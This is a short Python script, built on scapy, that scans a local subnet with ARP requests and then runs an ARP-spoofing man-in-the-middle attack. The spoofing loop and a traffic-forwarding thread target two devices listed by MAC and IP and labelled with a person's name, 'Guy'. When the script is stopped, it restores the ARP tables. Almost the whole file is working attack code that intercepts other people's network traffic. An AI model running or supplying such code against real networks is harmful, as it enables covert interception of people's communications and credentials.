from scapy.all import *
from spoofer import *
from sniffer import *
import threading
import time

devices = {
    "28:d0:43:c7:bf:6c": {"name": "Guy", "device": "Laptop", "ip" : "192.168.10.133"},
    "72:26:6a:4f:52:1a": {"name": "Guy", "device": "iPhone", "ip" : "192.168.10.218"},
}

def main():
    gateway_ip = "192.168.10.1"
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.10.0/24"), timeout=2, verbose=0)

    for sent, received in answered:
        print(f"{received.psrc} → {received.hwsrc}")
    my_mac = get_if_hwaddr(conf.iface)
    gateway_mac = get_mac(gateway_ip)
    ip_to_mac = {info["ip"]: mac for mac, info in devices.items()}

    print(f"My MAC:      {my_mac}")
    print(f"Gateway MAC: {gateway_mac}")

    try:
        forwarding_thread = threading.Thread(target=start_forwarding, args=(devices, ip_to_mac, gateway_mac, my_mac))
        forwarding_thread.daemon = True
        forwarding_thread.start()
        while True:
            for mac, info in devices.items():
                spoof(info["ip"], gateway_ip, mac, my_mac)
                spoof(gateway_ip, info["ip"], gateway_mac, my_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        for mac, info in devices.items():
            restore_arp(info["ip"], mac, gateway_ip, gateway_mac)
        print("\nStopping.")

if __name__ == "__main__":
    main()
